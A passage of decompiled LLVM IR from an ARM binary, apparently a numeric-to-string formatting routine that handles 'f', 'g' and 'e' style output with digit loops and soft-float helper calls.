  %v0_13ef8 = phi i32 [ 9, %bb208 ], [ %v0_13f8c, %dec_label_pc_13f8c.dec_label_pc_13ef4_crit_edge ]
  %v2_13f3c = phi i32 [ 8, %bb208 ], [ %stack_var_-192.3, %dec_label_pc_13f8c.dec_label_pc_13ef4_crit_edge ]
  store i32 %v0_13ed0, i32* %r2.global-to-local, align 4
  %v1_13ef8 = add i32 %v0_13ef8, -1
  store i32 %v1_13ef8, i32* %sl.global-to-local, align 4
  store i32 %v2_13efc, i32* @lr, align 4
  %v3_13f00 = mul i32 %v1_13ef8, 8
  store i32 %v3_13f00, i32* %r3.global-to-local, align 4
  store i1 %v2_13f04, i1* %cpsr_z.global-to-local, align 1
  %v0_13f08 = load i32, i32* @r5, align 4
  store i32 %v0_13f08, i32* %r0.global-to-local, align 4
  %v0_13f0c = load i32, i32* @r6, align 4
  store i32 %v0_13f0c, i32* %r1.global-to-local, align 4
  %v2_13f10 = add i32 %v3_13f00, %v2_13efc
  store i32 %v2_13f10, i32* %ip.global-to-local, align 4
  %v1_13f4c = inttoptr i32 %v2_13f10 to i32*
  %v2_13f4c = load i32, i32* %v1_13f4c, align 4
  store i32 %v2_13f4c, i32* %r2.global-to-local, align 4
  %v3_13f4c = add i32 %v2_13f10, 4
  %v4_13f4c = inttoptr i32 %v3_13f4c to i32*
  %v5_13f4c = load i32, i32* %v4_13f4c, align 4
  store i32 %v5_13f4c, i32* %r3.global-to-local, align 4
  br i1 %v2_13f04, label %dec_label_pc_13f4c, label %dec_label_pc_13f18

dec_label_pc_13f18:                               ; preds = %dec_label_pc_13ef4
  %v4_13f1c = sext i32 %v0_13f08 to i64
  %v5_13f1c = call i32 @function_18250(i64 %v4_13f1c, i32 %v0_13f0c, i32 %v2_13f4c, i32 %v5_13f4c)
  store i32 %v5_13f1c, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v5_13f1c, i32* %r7.global-to-local, align 4
  store i32 %v0_13f0c, i32* %r8.global-to-local, align 4
  %v1_13f30 = call i32 @function_187cc(i32 %v5_13f1c)
  store i32 %v1_13f30, i32* %r0.global-to-local, align 4
  %v2_13f34 = icmp eq i32 %v1_13f30, 0
  store i1 %v2_13f34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f34, label %dec_label_pc_13f8c, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_13f18
  %v1_13f3c = load i32, i32* @r4, align 4
  %v3_13f3c = sub i32 %v2_13f3c, %v1_13f3c
  store i32 %v3_13f3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f84

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13ef4
  store i32 %v0_13f08, i32* %r0.global-to-local, align 4
  store i32 %v0_13f0c, i32* %r1.global-to-local, align 4
  %v4_13f58 = call i32 @function_184e0(i32 %v0_13f08, i32 %v0_13f0c, i32 %v2_13f4c, i32 %v5_13f4c)
  store i32 %v4_13f58, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v4_13f58, i32* %r7.global-to-local, align 4
  store i32 %v0_13f0c, i32* %r8.global-to-local, align 4
  %v4_13f6c = call i32 @function_187fc(i32 %v4_13f58, i32 %v0_13f0c, i32 0, i32 1100470148)
  store i32 %v4_13f6c, i32* %r0.global-to-local, align 4
  %v2_13f70 = icmp eq i32 %v4_13f6c, 0
  store i1 %v2_13f70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f70, label %dec_label_pc_13f8c, label %dec_label_pc_13f78

dec_label_pc_13f78:                               ; preds = %dec_label_pc_13f4c
  %v1_13f7c = load i32, i32* @r4, align 4
  %v2_13f7c = add i32 %v1_13f7c, %v2_13f3c
  store i32 %v2_13f7c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13f84

dec_label_pc_13f84:                               ; preds = %.thread10, %dec_label_pc_13f78
  %stack_var_-192.2 = phi i32 [ %v2_13f7c, %dec_label_pc_13f78 ], [ %v3_13f3c, %.thread10 ]
  %v0_13f84 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13f84, i32* @r5, align 4
  %v0_13f88 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13f88, i32* @r6, align 4
  br label %dec_label_pc_13f8c

dec_label_pc_13f8c:                               ; preds = %dec_label_pc_13f18, %dec_label_pc_13f4c, %dec_label_pc_13f84
  %stack_var_-192.3 = phi i32 [ %v2_13f3c, %dec_label_pc_13f4c ], [ %stack_var_-192.2, %dec_label_pc_13f84 ], [ %v2_13f3c, %dec_label_pc_13f18 ]
  %v0_13f8c = load i32, i32* %sl.global-to-local, align 4
  %v2_13f8c = icmp eq i32 %v0_13f8c, 0
  store i1 %v2_13f8c, i1* %cpsr_z.global-to-local, align 1
  %v0_13f90 = load i32, i32* @r4, align 4
  %v3_13f90 = sdiv i32 %v0_13f90, 2
  store i32 %v3_13f90, i32* @r4, align 4
  br i1 %v2_13f8c, label %dec_label_pc_13f98, label %dec_label_pc_13f8c.dec_label_pc_13ef4_crit_edge

dec_label_pc_13f8c.dec_label_pc_13ef4_crit_edge:  ; preds = %dec_label_pc_13f8c
  %v2_13efc.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_13ef4

dec_label_pc_13f98:                               ; preds = %dec_label_pc_13f8c
  %v0_13f98 = load i32, i32* @r5, align 4
  store i32 %v0_13f98, i32* @r0, align 4
  %v0_13f9c = load i32, i32* @r6, align 4
  store i32 %v0_13f9c, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v4_13fa8 = call i32 @function_187fc(i32 %v0_13f98, i32 %v0_13f9c, i32 0, i32 1104006501)
  store i32 %v4_13fa8, i32* %r0.global-to-local, align 4
  %v2_13fac = icmp eq i32 %v4_13fa8, 0
  store i1 %v2_13fac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fac, label %dec_label_pc_13fdc, label %dec_label_pc_13fb4

dec_label_pc_13fb4:                               ; preds = %dec_label_pc_13f98
  %v0_13fb4 = load i32, i32* @r5, align 4
  store i32 %v0_13fb4, i32* %r0.global-to-local, align 4
  %v0_13fb8 = load i32, i32* @r6, align 4
  store i32 %v0_13fb8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v4_13fc4 = call i32 @function_184e0(i32 %v0_13fb4, i32 %v0_13fb8, i32 0, i32 1076101120)
  store i32 %v4_13fc4, i32* %r0.global-to-local, align 4
  store i32 %v4_13fc4, i32* @r5, align 4
  store i32 %v0_13fb8, i32* @r6, align 4
  %v1_13fd4 = add i32 %stack_var_-192.3, 1
  store i32 %v1_13fd4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13fdc

dec_label_pc_13fdc:                               ; preds = %dec_label_pc_13fb4, %bb204, %dec_label_pc_13f98, %dec_label_pc_13dfc
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_13f98 ], [ -1, %dec_label_pc_13dfc ], [ -1, %bb204 ], [ %v1_13fd4, %dec_label_pc_13fb4 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_13fe0 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_13fe0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13fe4

dec_label_pc_13fe4:                               ; preds = %dec_label_pc_1405c, %dec_label_pc_13fdc
  %v0_13fe4 = load i32, i32* @r6, align 4
  store i32 %v0_13fe4, i32* %r1.global-to-local, align 4
  %v0_13fe8 = load i32, i32* @r5, align 4
  store i32 %v0_13fe8, i32* %r0.global-to-local, align 4
  %v2_13fec = call i32 @function_1882c(i32 %v0_13fe8, i32 %v0_13fe4)
  store i32 %v2_13fec, i32* @r0, align 4
  store i32 %v2_13fec, i32* %r8.global-to-local, align 4
  %v0_13ff4 = call i32 @function_18150()
  store i32 %v0_13ff4, i32* %r2.global-to-local, align 4
  store i32 %v0_13fe4, i32* %r3.global-to-local, align 4
  %v0_14000 = load i32, i32* @r5, align 4
  store i32 %v0_14000, i32* @r0, align 4
  %v0_14004 = load i32, i32* @r6, align 4
  store i32 %v0_14004, i32* %r1.global-to-local, align 4
  %v4_14008 = call i32 @function_17e3c(i32 %v0_14000, i32 %v0_14004, i32 %v0_13ff4, i32 %v0_13fe4)
  store i32 %v4_14008, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v4_14014 = sext i32 %v4_14008 to i64
  %v5_14014 = call i32 @function_18250(i64 %v4_14014, i32 %v0_14004, i32 0, i32 1104006501)
  store i32 %v5_14014, i32* %r0.global-to-local, align 4
  %v0_14018 = load i32, i32* %sl.global-to-local, align 4
  %v1_14018 = add i32 %v0_14018, 9
  store i32 %v1_14018, i32* %sl.global-to-local, align 4
  store i32 %v5_14014, i32* @r5, align 4
  store i32 %v0_14004, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v0_14028.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14028

dec_label_pc_14028:                               ; preds = %dec_label_pc_14028, %dec_label_pc_13fe4
  %v0_14028 = phi i32 [ %v0_1404c, %dec_label_pc_14028 ], [ %v0_14028.pre, %dec_label_pc_13fe4 ]
  store i32 %v0_14028, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_14030 = call i32 @function_cc2c(i32 %v0_14028, i32 10)
  %v0_14034 = load i32, i32* @r7, align 4
  %v1_14034 = add i32 %v0_14034, 1
  store i32 %v1_14034, i32* @r7, align 4
  store i32 58, i32* %r2.global-to-local, align 4
  %v1_1403c = load i32, i32* %sl.global-to-local, align 4
  %v2_1403c = sub i32 %v1_1403c, %v1_14034
  store i32 %v2_1403c, i32* @r3, align 4
  %v0_14040 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14040, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v3_14048 = inttoptr i32 %v2_1403c to i8*
  store i8 58, i8* %v3_14048, align 1
  %v0_1404c = call i32 @function_cb30()
  store i32 %v0_1404c, i32* %r0.global-to-local, align 4
  %v0_14050 = load i32, i32* @r7, align 4
  %v7_14050 = icmp eq i32 %v0_14050, 8
  store i1 %v7_14050, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1404c, i32* %r8.global-to-local, align 4
  %v7_14058 = icmp slt i32 %v0_14050, 9
  br i1 %v7_14058, label %dec_label_pc_14028, label %dec_label_pc_1405c

dec_label_pc_1405c:                               ; preds = %dec_label_pc_14028
  %v0_1405c = load i32, i32* @r4, align 4
  %v1_1405c = add i32 %v0_1405c, 1
  store i32 %v1_1405c, i32* %r4.global-to-local, align 4
  %v7_14060 = icmp eq i32 %v0_1405c, 0
  store i1 %v7_14060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14060, label %dec_label_pc_13fe4, label %dec_label_pc_14068

dec_label_pc_14068:                               ; preds = %dec_label_pc_1405c
  %v0_14068 = load i32, i32* %sb.global-to-local, align 4
  %v7_14068 = icmp eq i32 %v0_14068, 96
  store i1 %v7_14068, i1* %cpsr_z.global-to-local, align 1
  %tmp270 = icmp ult i32 %v0_14068, 97
  br i1 %tmp270, label %bb209, label %thread-pre-split

bb209:                                            ; preds = %dec_label_pc_14068
  %v5_14078 = add i32 %v0_14068, 32
  store i32 %v5_14078, i32* %r3.global-to-local, align 4
  %v5_1407c = urem i32 %v5_14078, 256
  store i32 %v5_1407c, i32* %sb.global-to-local, align 4
  br label %bb210

thread-pre-split:                                 ; preds = %dec_label_pc_14068
  %v4_14074.pre126131 = load i32, i32* @r3, align 4
  %phitmp = urem i32 %v4_14074.pre126131, 256
  br label %bb210

bb210:                                            ; preds = %thread-pre-split, %bb209
  %v4_14074123127 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb209 ]
  %v0_1409c = phi i32 [ %v0_14068, %thread-pre-split ], [ %v5_1407c, %bb209 ]
  %v7_14080 = icmp eq i32 %v0_1409c, 103
  %. = zext i1 %v7_14080 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_1408c = load i32, i32* %fp.global-to-local, align 4
  %v2_1408c = icmp eq i32 %v0_1408c, 0
  store i1 %v2_1408c, i1* %cpsr_z.global-to-local, align 1
  %tmp213 = icmp slt i32 %v0_1408c, 1
  br i1 %tmp213, label %.thread16, label %bb214

.thread16:                                        ; preds = %bb210
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb216

bb214:                                            ; preds = %bb210
  %v2_14094 = icmp eq i1 %v7_14080, false
  store i1 %v2_14094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14094, label %bb216, label %bb215

bb215:                                            ; preds = %bb214
  %v2_14098 = add i32 %v0_1408c, -1
  store i32 %v2_14098, i32* %fp.global-to-local, align 4
  br label %bb216

bb216:                                            ; preds = %.thread16, %bb214, %bb215
  %v0_140ac = phi i32 [ %v0_1408c, %.thread16 ], [ %v0_1408c, %bb214 ], [ %v2_14098, %bb215 ]
  %v7_1409c = icmp eq i32 %v0_1409c, 102
  store i1 %v7_1409c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1409c, label %dec_label_pc_140a8, label %bb217

bb217:                                            ; preds = %bb216
  store i32 %v0_140ac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_140d0

dec_label_pc_140a8:                               ; preds = %bb216
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_140ac = add i32 %v0_140ac, %stack_var_-192.4
  store i32 %v2_140ac, i32* %ip.global-to-local, align 4
  %v8_140b0 = icmp eq i32 %v2_140ac, -1
  store i1 %v8_140b0, i1* %cpsr_z.global-to-local, align 1
  %v6_140b4 = icmp slt i32 %v2_140ac, -1
  br i1 %v6_140b4, label %dec_label_pc_140b8, label %dec_label_pc_140d0

dec_label_pc_140b8:                               ; preds = %dec_label_pc_140a8
  %v2_140b8 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_140b8, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_140c4 = bitcast i32* %stack_var_-83 to i8*
  %v3_140c4 = call i32 @function_f5d0(i8* %v2_140c4, i32 48)
  store i32 %v3_140c4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_140d0

dec_label_pc_140d0:                               ; preds = %bb217, %dec_label_pc_140a8, %dec_label_pc_140b8
  %v1_1411490 = phi i32 [ %v3_140c4, %dec_label_pc_140b8 ], [ %v0_1404c, %dec_label_pc_140a8 ], [ %v0_1404c, %bb217 ]
  %v1_140f8 = phi i32 [ -1, %dec_label_pc_140b8 ], [ %v2_140ac, %dec_label_pc_140a8 ], [ %v0_140ac, %bb217 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_140b8 ], [ %stack_var_-192.4, %dec_label_pc_140a8 ], [ %stack_var_-192.4, %bb217 ]
  %v1_140d4 = add i32 %v1_140f8, -16
  %v3_140d4 = sub i32 15, %v1_140f8
  %v4_140d4 = and i32 %v3_140d4, %v1_140f8
  %v5_140d4 = icmp slt i32 %v4_140d4, 0
  %v6_140d4 = icmp slt i32 %v1_140d4, 0
  %v7_140d4 = icmp eq i32 %v1_140f8, 16
  store i1 %v7_140d4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_140e0 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_140e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_140e8 = xor i1 %v6_140d4, %v5_140d4
  %v4_140e8 = or i1 %v7_140d4, %v3_140e8
  br i1 %v4_140e8, label %dec_label_pc_140f4, label %.thread137

.thread137:                                       ; preds = %dec_label_pc_140d0
  %v7_140e8134138 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_140e8134138, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_140f4:                               ; preds = %dec_label_pc_140d0
  %v2_140f4 = ptrtoint i32* %stack_var_-82 to i32
  %v2_140f8 = add i32 %v1_140f8, %v2_140f4
  store i32 %v2_140f8, i32* %r3.global-to-local, align 4
  %v1_140fc = add i32 %v2_140f8, 2
  %v2_140fc = inttoptr i32 %v1_140fc to i8*
  %v3_140fc = load i8, i8* %v2_140fc, align 1
  %v4_140fc = zext i8 %v3_140fc to i32
  store i32 %v4_140fc, i32* %r2.global-to-local, align 4
  store i32 %v1_140fc, i32* %r1.global-to-local, align 4
  %v2_14104 = icmp ugt i8 %v3_140fc, 51
  %v7_14104 = icmp eq i8 %v3_140fc, 52
  store i1 %v7_14104, i1* %cpsr_z.global-to-local, align 1
  %v2_14108 = xor i1 %v2_14104, true
  %v3_14108 = or i1 %v7_14104, %v2_14108
  br i1 %v3_14108, label %bb218, label %bb219

bb218:                                            ; preds = %dec_label_pc_140f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb219

bb219:                                            ; preds = %dec_label_pc_140f4, %bb218
  %v1_1411488 = phi i32 [ %v1_1411490, %dec_label_pc_140f4 ], [ 0, %bb218 ]
  %v2_1410c = xor i1 %v7_14104, true
  %v3_1410c = and i1 %v2_14104, %v2_1410c
  br i1 %v3_1410c, label %bb220, label %.preheader

bb220:                                            ; preds = %bb219
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb219, %bb220, %.thread137, %._crit_edge85
  %v0_14110 = phi i32 [ %v0_14110.pre, %._crit_edge85 ], [ %v7_140e8134138, %.thread137 ], [ %v1_140fc, %bb219 ], [ %v1_140fc, %bb220 ]
  %v1_14114 = phi i32 [ %v1_14114.pre, %._crit_edge85 ], [ 0, %.thread137 ], [ %v1_1411488, %bb219 ], [ 1, %bb220 ]
  %v1_14110 = add i32 %v0_14110, -1
  %v2_14110 = inttoptr i32 %v1_14110 to i8*
  %v3_14110 = load i8, i8* %v2_14110, align 1
  %v4_14110 = zext i8 %v3_14110 to i32
  store i32 %v1_14110, i32* %r1.global-to-local, align 4
  %v2_14114 = add i32 %v4_14110, %v1_14114
  %v1_14118 = urem i32 %v2_14114, 256
  store i32 %v1_14118, i32* %r3.global-to-local, align 4
  %v2_1411c = icmp ugt i32 %v1_14118, 56
  %v7_1411c = icmp eq i32 %v1_14118, 57
  store i1 %v7_1411c, i1* %cpsr_z.global-to-local, align 1
  %v2_14120 = xor i1 %v2_1411c, true
  %v3_14120 = or i1 %v7_1411c, %v2_14120
  br i1 %v3_14120, label %bb221, label %bb222

bb221:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %.preheader, %bb221
  %v2_14124 = xor i1 %v7_1411c, true
  %v3_14124 = and i1 %v2_1411c, %v2_14124
  br i1 %v3_14124, label %bb223, label %bb222.bb224_crit_edge

bb222.bb224_crit_edge:                            ; preds = %bb222
  %v1_1412c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb224

bb223:                                            ; preds = %bb222
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb224

bb224:                                            ; preds = %bb222.bb224_crit_edge, %bb223
  %v1_1412c = phi i32 [ %v1_1412c.pre, %bb222.bb224_crit_edge ], [ 1, %bb223 ]
  %v7_14128 = icmp eq i32 %v1_14118, 48
  store i1 %v7_14128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14128, label %bb225, label %._crit_edge91

bb225:                                            ; preds = %bb224
  %v2_1412c = or i32 %v1_1412c, 1
  store i32 %v2_1412c, i32* %r2.global-to-local, align 4
  br label %._crit_edge91

._crit_edge91:                                    ; preds = %bb224, %bb225
  %v0_14130 = phi i32 [ 1, %bb225 ], [ %v1_1412c, %bb224 ]
  %v2_14130 = icmp eq i32 %v0_14130, 0
  store i1 %v2_14130, i1* %cpsr_z.global-to-local, align 1
  %v1_14134 = trunc i32 %v2_14114 to i8
  store i8 %v1_14134, i8* %v2_14110, align 1
  %v0_14138 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14138, label %dec_label_pc_1413c, label %._crit_edge85

._crit_edge85:                                    ; preds = %._crit_edge91
  %v1_14114.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_14110.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_1413c:                               ; preds = %._crit_edge91
  store i32 %v2_140e0, i32* %r2.global-to-local, align 4
  %v2_14140 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_14140, i32* %r3.global-to-local, align 4
  %v0_14144 = load i32, i32* %r1.global-to-local, align 4
  %v3_14144 = icmp uge i32 %v0_14144, %v2_14140
  %v9_14144 = icmp eq i32 %v0_14144, %v2_14140
  store i1 %v9_14144, i1* %cpsr_z.global-to-local, align 1
  %v2_14148 = xor i1 %v3_14144, true
  %v3_14148 = or i1 %v9_14144, %v2_14148
  br i1 %v3_14148, label %bb226, label %.thread142

bb226:                                            ; preds = %dec_label_pc_1413c
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_14140, i32* %r2.global-to-local, align 4
  store i32 %v2_14140, i32* %r1.global-to-local, align 4
  br label %.thread142

.thread142:                                       ; preds = %dec_label_pc_1413c, %bb226
  %v2_14168 = phi i32 [ %v2_14140, %bb226 ], [ %v0_14144, %dec_label_pc_1413c ]
  %v4_1415c141 = phi i32 [ %v2_14140, %bb226 ], [ %v2_140e0, %dec_label_pc_1413c ]
  %v2_14154 = xor i1 %v9_14144, true
  %v3_14154 = and i1 %v3_14144, %v2_14154
  br i1 %v3_14154, label %bb227, label %bb228

bb227:                                            ; preds = %.thread142
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %.thread142, %bb227
  br i1 %v3_14148, label %bb229, label %bb230

bb229:                                            ; preds = %bb228
  %v4_14158 = load i32, i32* @lr, align 4
  %v5_14158 = add i32 %v4_14158, 1
  store i32 %v5_14158, i32* %r0.global-to-local, align 4
  br label %bb230

bb230:                                            ; preds = %bb228, %bb229
  br i1 %v3_14154, label %bb231, label %bb232

bb231:                                            ; preds = %bb230
  %v5_1415c = add i32 %v4_1415c141, 2
  store i32 %v5_1415c, i32* %r2.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %bb230, %bb231
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14164 = load i32, i32* %sb.global-to-local, align 4
  %v7_14164 = icmp eq i32 %v0_14164, 103
  store i1 %v7_14164, i1* %cpsr_z.global-to-local, align 1
  %v3_14168 = add i32 %v2_14168, 1
  %v4_14168 = inttoptr i32 %v3_14168 to i8*
  store i8 0, i8* %v4_14168, align 1
  %v0_1416c = load i32, i32* %r1.global-to-local, align 4
  %v1_1416c = add i32 %v0_1416c, 1
  store i32 %v1_1416c, i32* %lr.global-to-local, align 4
  %v0_14170 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14170, label %dec_label_pc_14174, label %dec_label_pc_1419c

dec_label_pc_14174:                               ; preds = %bb232
  %v0_14174 = load i32, i32* %r0.global-to-local, align 4
  %v1_14174 = load i32, i32* %ip.global-to-local, align 4
  %v2_14174 = sub i32 %v0_14174, %v1_14174
  %v4_14174 = xor i32 %v1_14174, %v0_14174
  %v5_14174 = xor i32 %v2_14174, %v0_14174
  %v6_14174 = and i32 %v5_14174, %v4_14174
  %v7_14174 = icmp slt i32 %v6_14174, 0
  %v8_14174 = icmp slt i32 %v2_14174, 0
  %v9_14174 = icmp eq i32 %v0_14174, %v1_14174
  %v3_14178 = xor i1 %v8_14174, %v7_14174
  %v4_14178 = or i1 %v9_14174, %v3_14178
  %.254 = zext i1 %v4_14178 to i32
  store i32 %.254, i32* %r3.global-to-local, align 4
  %v1_14180 = add i32 %v0_14174, 4
  %v3_14180 = sub i32 0, %v0_14174
  %v4_14180 = and i32 %v1_14180, %v3_14180
  %v5_14180 = icmp slt i32 %v4_14180, 0
  %v6_14180 = icmp slt i32 %v1_14180, 0
  %v7_14180 = icmp eq i32 %v1_14180, 0
  store i1 %v7_14180, i1* %cpsr_z.global-to-local, align 1
  %v2_14184 = xor i1 %v6_14180, %v5_14180
  br i1 %v2_14184, label %.thread21, label %bb235

.thread21:                                        ; preds = %dec_label_pc_14174
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_144b8

bb235:                                            ; preds = %dec_label_pc_14174
  %v2_14188 = icmp eq i1 %v4_14178, false
  store i1 %v2_14188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14188, label %dec_label_pc_144b8, label %.thread24

.thread24:                                        ; preds = %bb235
  %v3_1418c = sub i32 %v1_14174, %v0_14174
  store i32 %v3_1418c, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_141a8

dec_label_pc_1419c:                               ; preds = %bb232
  %v0_1419c = load i32, i32* %sb.global-to-local, align 4
  %v7_1419c = icmp eq i32 %v0_1419c, 102
  store i1 %v7_1419c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1419c, i32* %r8.global-to-local, align 4
  br i1 %v7_1419c, label %dec_label_pc_1419c.dec_label_pc_141a8_crit_edge, label %dec_label_pc_141b8

dec_label_pc_1419c.dec_label_pc_141a8_crit_edge:  ; preds = %dec_label_pc_1419c
  %v0_141a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_141a8

dec_label_pc_141a8:                               ; preds = %.thread24, %dec_label_pc_1419c.dec_label_pc_141a8_crit_edge
  %v0_141a8 = phi i32 [ %v0_141a8.pre, %dec_label_pc_1419c.dec_label_pc_141a8_crit_edge ], [ %v0_14174, %.thread24 ]
  %v1_141a8 = icmp slt i32 %v0_141a8, 0
  %v2_141a8 = icmp eq i32 %v0_141a8, 0
  store i1 %v2_141a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_141a8, label %bb236, label %dec_label_pc_141b8

bb236:                                            ; preds = %dec_label_pc_141a8
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_141b0 = load i32, i32* %r2.global-to-local, align 4
  %v6_141b0 = add i32 %v5_141b0, -1
  %v7_141b0 = inttoptr i32 %v6_141b0 to i8*
  store i8 48, i8* %v7_141b0, align 1
  %v8_141b0 = load i32, i32* %r2.global-to-local, align 4
  %v9_141b0 = add i32 %v8_141b0, -1
  store i32 %v9_141b0, i32* %r2.global-to-local, align 4
  %v0_141b4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_141e8.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_141b8

dec_label_pc_141b8:                               ; preds = %bb236, %dec_label_pc_141a8, %dec_label_pc_144b8, %dec_label_pc_1419c
  %v1_141e8 = phi i32 [ %v1_1416c, %dec_label_pc_1419c ], [ %v1_1416c, %dec_label_pc_144b8 ], [ %v1_141e8.pre.pre, %bb236 ], [ %v1_1416c, %dec_label_pc_141a8 ]
  %v1_1426030 = phi i32 [ 0, %dec_label_pc_1419c ], [ 0, %dec_label_pc_144b8 ], [ %v0_141b4.pre, %bb236 ], [ %v0_141a8, %dec_label_pc_141a8 ]
  store i32 %v1_1426030, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_141c4 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_141c4, i32* %r3.global-to-local, align 4
  %v0_141d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_141d0 = inttoptr i32 %v0_141d0 to i8*
  %v2_141d0 = load i8, i8* %v1_141d0, align 1
  %v3_141d0 = zext i8 %v2_141d0 to i32
  store i32 %v3_141d0, i32* %r3.global-to-local, align 4
  %v5_141d0 = add i32 %v0_141d0, 1
  store i32 %v5_141d0, i32* %r2.global-to-local, align 4
  %v1_141d4 = icmp slt i32 %v1_1426030, 0
  %v2_141d4 = icmp eq i32 %v1_1426030, 0
  store i1 %v2_141d4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_141d0, i32* %r6.global-to-local, align 4
  store i32 %v3_141d0, i32* %stack_var_-42, align 4
  %v2_141e8 = sub i32 %v1_141e8, %v5_141d0
  store i32 %v2_141e8, i32* %ip.global-to-local, align 4
  br i1 %v1_141d4, label %.thread, label %dec_label_pc_141f4

.thread:                                          ; preds = %dec_label_pc_141b8
  %v5_141ec = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_141ec, i32* @r7, align 4
  br label %dec_label_pc_14270

dec_label_pc_141f4:                               ; preds = %dec_label_pc_141b8
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_141f8 = sub i32 %v1_1426030, %v2_141e8
  %v4_141f8 = xor i32 %v2_141e8, %v1_1426030
  %v5_141f8 = xor i32 %v2_141f8, %v1_1426030
  %v6_141f8 = and i32 %v5_141f8, %v4_141f8
  %v7_141f8 = icmp slt i32 %v6_141f8, 0
  %v8_141f8 = icmp slt i32 %v2_141f8, 0
  %v9_141f8 = icmp eq i32 %v1_1426030, %v2_141e8
  store i1 %v9_141f8, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_14204 = xor i1 %v8_141f8, %v7_141f8
  br i1 %v2_14204, label %dec_label_pc_14250, label %dec_label_pc_14208

dec_label_pc_14208:                               ; preds = %dec_label_pc_141f4
